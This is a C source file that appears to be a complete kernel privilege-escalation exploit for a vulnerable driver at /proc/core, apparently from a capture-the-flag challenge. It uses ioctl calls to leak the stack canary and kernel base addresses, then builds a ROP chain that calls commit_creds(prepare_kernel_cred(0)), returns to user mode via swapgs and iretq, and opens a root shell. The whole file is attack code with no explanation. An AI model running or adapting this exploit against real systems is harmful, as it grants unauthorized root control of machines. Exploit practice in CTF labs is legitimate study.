#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>

int fd;
typedef unsigned long long  uint64;

uint64 user_cs, user_ss, user_rsp, eflags;
void save_stats(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        :"=r" (user_cs) , "=r"(user_ss), "=r"(user_rsp), "=r"(eflags)
        : 
        :"memory"
        );
}



void core_read(char * buf){
    ioctl(fd, 0x6677889B, buf);
}

void setoff(int off){
    ioctl(fd, 0x6677889C, off);
}
void copy_func(uint64 size){
    ioctl(fd, 0x6677889A, size);
}

void get_shell(){
    system("/bin/sh");
}


#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void get_root(){
      commit_creds(prepare_kernel_cred(0));
}

int main(){
    save_stats();
    fd = open("/proc/core", O_RDWR);
    if (fd == -1){
        printf("open file error!\n");
        exit(-1);
    }else {
        printf("open file success!\n");
    }

    uint64 buf[0x40 / 8];
    memset(buf, 0, 0x40);
    setoff(0x40);
    core_read(buf);
    // off=0x40 -> canary
    // off=0x50 -> core_base
    uint64 canary = buf[0];
    uint64 core_base = buf[2] - 0x19b;
    uint64 vm_base = buf[4] - 0x1dd6d1;
    printf("[*] cancry: %p\n", canary);
    printf("[*] core_base: %p\n", core_base);
    printf("[*] vm_base: %p\n", vm_base);

    uint64 swapgs = core_base + 0x00000000000000D6;
    uint64 iretq  = vm_base + 0x50ac2;

    commit_creds = vm_base + 0x9c8e0;
    prepare_kernel_cred = vm_base + 0x9cce0;

    uint64 pop_rid = vm_base + 0xb2f;
    uint64 pop_rcx = vm_base + 0x21e53;
    uint64 mov_rdi_rax_jmp_rcx = vm_base + 0x1ae978;


    uint64 rop[0x100/8];
    memset(rop, 0, 0x40);
    int i = 8;
    rop[i++] = canary;
    rop[i++] = 0;
    // to root

// rop
//    rop[i++] = pop_rid;
//    rop[i++] = 0;
//    rop[i++] = prepare_kernel_cred;
//    rop[i++] = pop_rbp;
//    rop[i++] = commit_creds;
//    rop[i++] = mov_rdi_rax_jmp_rcx;
    rop[i++] = get_root;

    // reture to user
    rop[i++] = swapgs;
    rop[i++] = 0;
    rop[i++] = iretq;
    rop[i++] = (uint64)get_shell;
    rop[i++] = user_cs;
    rop[i++] = eflags;
    rop[i++] = user_rsp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100 );
    copy_func(0x100 | 0xFFFFFFFFFFFF0000);
}

